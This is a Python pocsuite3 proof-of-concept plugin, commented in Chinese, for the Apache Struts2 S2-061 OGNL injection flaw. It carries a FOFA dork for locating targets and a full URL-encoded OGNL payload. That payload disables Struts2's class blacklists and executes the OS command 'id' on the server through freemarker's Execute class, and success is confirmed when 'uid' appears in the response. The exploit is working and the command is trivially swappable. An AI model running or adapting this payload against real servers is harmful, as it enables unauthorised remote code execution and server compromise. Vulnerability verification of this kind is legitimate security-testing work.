from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


# 关于类的继承
class struts2_Poc(POCBase):
    dork_fofa = 'app="Apache Struts2"'
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "struts2"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.freebuf.com/vuls/258112.html"]  # 漏洞地址来源,0day不用写
    name = "struts2-061远程代码执行漏洞 PoC"  # PoC 名称
    appPowerLink = "https://www.freebuf.com/vuls/258112.html"  # 漏洞厂商主页地址
    appName = "struts2"  # 漏洞应用名称
    appVersion = "Struts2 : 2.0.0 - 2.5.25"  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大"""  # 漏洞简要描述


  # POC用法描述

    def _check(self):
        result = []
        path = "/index.action"
        full_url = self.url.join(self.url, path)
        payload = "id=%0d%0a%25%7b%28%23instancemanager%3d%23application%5b%22org.apache.tomcat.InstanceManager%22%5d%29.%28%23stack%3d%23attr%5b%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5d%29.%28%23bean%3d%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3d%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3d%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3d%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2c%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2c%23emptyset%29%29.%28%23arglist%3d%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22id%22%29%29.%28%23execute%3d%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7d"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.get(full_url, headers=headers, data=payload, verify=False, allow_redirects=False,
                                    timeout=5)
            if "uid" in response.text:
                result.append(self.url)
        except Exception:
            print(f"[-]{self.url} 请求失败")
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result

    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()
        # res就是返回的结果列表
        if res:
            # 这些信息会在终端上显示
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass


# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(struts2_Poc)
